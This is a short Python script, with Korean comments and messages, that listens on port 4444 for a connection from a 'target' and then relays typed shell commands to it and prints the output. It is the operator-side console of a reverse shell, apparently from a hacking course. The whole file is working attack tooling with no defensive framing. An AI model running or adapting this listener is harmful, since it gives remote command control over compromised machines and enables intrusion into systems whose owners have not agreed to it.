#!/usr/bin/env python
import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] 타깃에서부터의 접속을 기다리는 중....")
        self.connection, address = listener.accept()
        print("[+] " + str(address) + "에서 접속이 확인됨.")
    
    def excute_remotely(self, command):  # str 입력받음
        self.connection.send(command.encode())  # str → bytes
        response = self.connection.recv(4096)
        return response.decode('utf-8', errors='replace')  # bytes → str

    def run(self):
        while True:
            command = input(">> ")  # str
            if command.strip().lower() == "exit":
                break
            result = self.excute_remotely(command)  # str만 전달
            print(result)

my_listner = Listener("0.0.0.0", 4444)
my_listner.run()
